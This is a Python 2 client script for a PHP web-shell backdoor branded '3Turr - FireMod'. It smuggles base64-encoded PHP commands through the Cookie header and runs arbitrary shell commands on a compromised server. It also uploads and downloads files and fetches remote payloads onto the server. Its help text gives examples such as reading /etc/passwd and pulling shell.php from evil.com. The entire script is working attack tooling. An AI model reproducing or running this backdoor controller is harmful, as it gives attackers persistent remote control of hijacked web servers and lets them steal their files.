#!/usr/bin/python
import sys
import os
import urllib2
import base64
import time
import re
import platform
from urlparse import urlparse

def get( t, url, p, pwd="", c="", r="https://www.google.com/search?", out=None):
        userAgent = 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36'
        fcmd = "@error_reporting(0);ini_set('error_log',NULL);ini_set('log_errors',1);ini_set('max_execution_time',0);set_time_limit(0);"
        p = 'p='+str(p)
        if len(pwd) > 0:
            fcmd += "chdir('"+pwd.strip()+"');"
        if t == "exec":
                fcmd +=  'function ex($c) {$o = \'\';if (function_exists(\'system\')) {ob_start();@system($c);$o = ob_get_clean();}elseif (function_exists(\'passthru\')) {ob_start();@passthru($c);$o = ob_get_clean();}elseif (is_resource($f = @popen($c,"r"))) {$o = "";while(!@feof($f))$o .= fread($f,1024);pclose($f);}elseif (function_exists(\'shell_exec\')) {$o = @shell_exec($c);}elseif (function_exists(\'exec\')) {@exec($c,$o);$o = @join("\\r\\n",$o);}else{$o = "[!]: could not execute commands";}return $o;}'+"echo ex('" + c.replace( "'", '\\\'' ) + "');"
        elif t == "#upload":
                if os.path.isfile(c):
                        if out == None:
                                fcmd += upload( c )
                        else:
                                fcmd += upload( out )

                        fp = base64.b64encode( open(c, "r").read() )
                        p += "&t="+fp.replace("=", "")
                else:
                        return "Error, wrong file"
        elif t == "#download":
                fcmd += download(c)
        elif t == "#downurl":
                fcmd += downurl(c)
        else:
                fcmd += c

        fcmd = encode( fcmd )
        headers = { \
        'User-agent': userAgent, \
        'Cookie': fcmd, \
        'Referer': r \
        }
        e = urllib2.Request(url, p, headers=headers)
        try:
                        response = urllib2.urlopen(e).read()
                        
        except:
                        response = "Error"
        return response.replace("<apple>","")

def encode( cmd ):
        cmd = base64.b64encode(cmd)
        max = len(cmd)
        c1 = ''
        c2 = ''
        for i in range(0,max / 2):
                c1 += cmd[i]
        for i in range(max / 2,max):
                c2 += cmd[i]
        finalc = 'a='+c1+';b='+c2.replace("=", "")
        return finalc


def upload( fileName ):
        run = "file_put_contents( '"+ fileName +"', base64_decode($_POST['t']));"\
              "if ( file_exists('"+fileName+"') &&  is_file('"+fileName+"') && md5(base64_decode($_POST['t']) == md5(file_get_contents('"+fileName+"') ) ) )"\
              "{echo 'Seccess';}"\
              "else{echo 'Failed';}"\
              "echo ' to Uploaded !';"
        return run

def download( fileName ):
        run = "if ( is_readable('"+ fileName +"') ){echo file_get_contents('"+ fileName +"', 'r');}else{echo 'ER00R';}"
        return run

def downurl( fileName ):
        run = "echo 'Uploaded ';if ( file_put_contents( \""+ fileName +"\", file_get_contens($_SERVER['HTTP_REFERER'])) )"\
              "{echo 'Seccess !';}else{echo 'Failed !';}"
        return run

def is_valid_url(url):
    regex = re.compile(
        r'^https?://'  # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?|'  # domain...
        r'localhost|'  # localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    return url is not None and regex.search(url)

def helpm( t ):
        if t == "url":
                return "Enter the php file URL path, EX: http://example.com/3Turr.php, etc"
        else:
                return "No extra information needed for this option!"

def checkpass( u, p ):
        ofc = "mojo"
        tmp = get( "", u, p, "", "echo '"+ofc+"';")
        if ofc in tmp:
                return True
        else:
                return False
        
def finput( m, t=None, f=False, url=""):
        tmp = str(m)
        tmpinput = raw_input( tmp )

        if tmpinput.lower() == "exit":
                print("[#]: Exiting...")
                sys.exit()
        elif ( f == True ):
                if tmpinput.lower() == "help":
                        print( helpm("url") )
                        tmpinput = finput( tmp, t, True)
                if t == "url":
                        if  not is_valid_url(tmpinput):
                                print("[!]: UNvalid URL !")
                                tmpinput = finput( tmp, t, True)
                        else:
                                return tmpinput
                elif t == "pass":
                        sys.stdout.write("[#]: Connecting...    \r")
                        if tmpinput == "":
                                tmpinput = "3Turr"
                        if checkpass( url, tmpinput ) == False:
                                sys.stdout.write("[!]: Wrong Password !   \r\n")
                                tmpinput = finput( tmp, t, True, url)
                        else:
                                print("[#]: Connected     ")
                                return tmpinput
                        
        else:
                return tmpinput

def options( user, domain, password, pwd, url ):
    option = "exec"
    
    print("Enter \"#help\" to see avalible options.")
    while option != "exit":
        if "dows" in platform.system():
            shell = user+"@"+domain+":"+pwd+"# "
        else:
            shell = "\033[0;31m"+user+ "\033[1;36m@\033[1;32m"+domain+"\033[1;30m:\033[1;36m"+pwd+"\033[1;31m#\033[m "
        tmp = raw_input(shell)
        if tmp == "#help":
            print("""OPTIONS:
 #help\t\tPrint this menu.
 #upload\tUpload file from clint to server.
 \t\t EX: #upload /path/shell.php /server/bak.php
 #download\tDownload a file from the server.
 \t\t EX: #download /etc/passwdx
 #downurl\tDownload file from URL to server.
 \t\t EX: #downurl http://evil.com/shell.php output.php
 #php\t\tExecute PHP eval codes.
 \t\t EX: #php echo 'apple';""")
        
        elif "#" in tmp:
            tmp = tmp.split(" ")
            if tmp[0] == "#upload":
                if not tmp[2] and len(tmp[1]) > 0 :
                    print( "[#]: " + get(tmp[0], url, password, pwd, tmp[1] ) )
                elif len(tmp[1]) > 0 and len(tmp[2]) > 0:
                    print( "[#]: " + get(tmp[0], url, password, pwd, tmp[1], None, tmp[2] ) )
                else:
                    print("[!]: Error, Wrong input")
            elif tmp[0] == "#download":
                if len(tmp[1]) > 0 and len(tmp) == 2:
                    
                    down = get(tmp[0], url, password, pwd, tmp[1] )
                    finfo = tmp[1].replace("\\","/").split("/")
                    fname = finfo[len(finfo)-1]
                    print("[+]: Downloading..."+fname)
                    
                    open(fname, "w").write( down )
                    if os.path.isfile(fname):
                        print( "[+]: File saved to :" + fname )
                    else:
                        print( "[!]: Error, Couldn't Download File" )
                else:
                    print("[!]: Error, Wrong input")
            elif tmp[0] == "#downurl":
                if len(tmp[1]) > 0 and len(tmp[2]) > 0:
                    print( "[+]: " + get(tmp[0], url, password, pwd, tmp[1] ) )
                else:
                    print("[!]: Error, Wrong input. check \"#help\"")
            elif tmp[0] == "#php":
                tmp[0] = ""
                print( get("", url, password, pwd, " ".join(tmp) ) )
        elif "cd" in tmp:
            tmp = tmp.split(" ")
            if  tmp[0].lower() == "cd" and len(tmp) > 1:
                if "\\" in tmp[1] or "/" in tmp[1]:
                    pwd = get("", url, password, tmp[1], "echo getcwd();")
                else:
                    if "\\" in pwd:
                        pwd = get("", url, password, pwd+"\\"+tmp[1], "echo getcwd();")
                    else:
                        pwd = get("", url, password, pwd+"/"+tmp[1], "echo getcwd();")
            else:
                print("[!]: Change with single command only.")
        elif tmp == "exit":
            print("[#]: Exiting...")
            sys.exit()
        else:
            print( get("exec", url, password, pwd, tmp ).strip() )
    
def main():
        
        burl = finput("[+]: Enter php BackDoor URL: ", "url", True)
        password = finput("[+]: Password (defualt 3Turr): ", "pass", True,  burl)
        
        pw = get("", burl, password, "", "echo getcwd();")
        domain = urlparse(burl)[1]
        user = get("", burl, password, "", "$r = posix_getpwuid(posix_getuid());echo $r['name'];")

        #print( get( '#upload', burl , password, pw, "x.txt", None, "xxx.TXT" ) )
        
        options(user, domain, password, pw, burl )

if __name__ == "__main__":
        print(" @3Turr - FireMod ")
        print("   Please upload the php backdoor file to your web server and follow the instractions. For help enter help, exit to exit!")
        try:
            main()
        except:
            print("[!]: Exiting...")